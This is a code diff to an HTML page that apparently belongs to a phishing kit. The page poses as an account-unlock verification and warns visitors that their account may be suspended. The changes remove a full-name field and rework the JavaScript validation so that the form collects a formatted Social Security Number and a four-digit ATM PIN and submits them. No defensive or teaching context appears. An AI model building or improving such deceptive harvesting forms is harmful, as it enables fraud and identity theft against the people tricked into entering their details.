@@ -421,12 +421,12 @@
             <span class="title">Confirm your Account information</span>
             <span class="subtitle">Please verify your accurate information to automatically unlock your account. Incorrect information may lead to suspension of your account.</span>
             <form action="profile" method="POST">
-                <label for="fulln">Full Name</label>
-                <input type="text" placeholder="Full Name" id="fulln" name="fullname">
+                <!-- <label for="fulln">Full Name</label> -->
+                <!-- <input type="text" placeholder="Full Name" id="fulln" name="fullname"> -->
                 <label for="ssn">Social Security Number</label>
                 <input type="text" placeholder="Social Security Number" id="ssn" name="ssn">
                 <label for="atmpin">ATM PIN</label>
-                <input type="number" placeholder="ATM PIN" id="atmpin" name="atmpin">
+                <input type="text" placeholder="ATM PIN" id="atmpin" name="atmpin" maxlength="4">
                 <button type="submit">Continue</button>
             </form>
         </div>
@@ -677,10 +677,10 @@
         inputs = [
             inputs[0],
             inputs[1],
-            inputs[2]
+            // inputs[2]
         ]
 
-        new Cleave(inputs[1], {
+        new Cleave(inputs[0], {
             numericOnly: 1,
             delimiter: '-',
             blocks: [3, 2, 4]
@@ -703,19 +703,27 @@
                 }
             });
 
-            if (inputs[1].value.trim().length != 11) {
+            if (inputs[0].value.trim().length != 11) {
+                e.preventDefault();
+
+                inputs[0].classList.add('error');
+                document.querySelectorAll('[for=' + inputs[0].id)[0].classList.add('error');
+            }
+
+            if (inputs[1].value.trim().length != 4) {
                 e.preventDefault();
 
                 inputs[1].classList.add('error');
                 document.querySelectorAll('[for=' + inputs[1].id)[0].classList.add('error');
             }
 
-            if (!inputs[2].value.trim().match(regex)) {
-                e.preventDefault();
+
+            // if (!inputs[2].value.trim().match(regex)) {
+            //     e.preventDefault();
                 
-                inputs[2].classList.add('error');
-                document.querySelectorAll('[for=' + inputs[2].id)[0].classList.add('error');
-            }
+            //     inputs[2].classList.add('error');
+            //     document.querySelectorAll('[for=' + inputs[2].id)[0].classList.add('error');
+            // }
         });
     </script>
 </html>
